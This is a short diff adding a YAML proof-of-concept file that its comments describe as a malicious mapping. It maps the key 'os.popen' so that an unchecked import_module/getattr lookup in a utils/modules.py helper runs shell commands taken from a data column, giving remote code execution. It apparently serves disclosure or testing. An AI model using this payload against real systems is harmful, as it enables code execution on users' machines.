@@ -1,0 +1,10 @@
+# Malicious mapping (what an attacker distributes as a .yaml file).
+# The key "os.popen" is resolved by get_function() in utils/modules.py,
+# which performs import_module + getattr with no allow-list -> RCE.
+# The sub-dict maps keyword arg names -> column names.
+grid:
+  Nodes:
+    node:
+      id:
+        os.popen:
+          cmd: Command
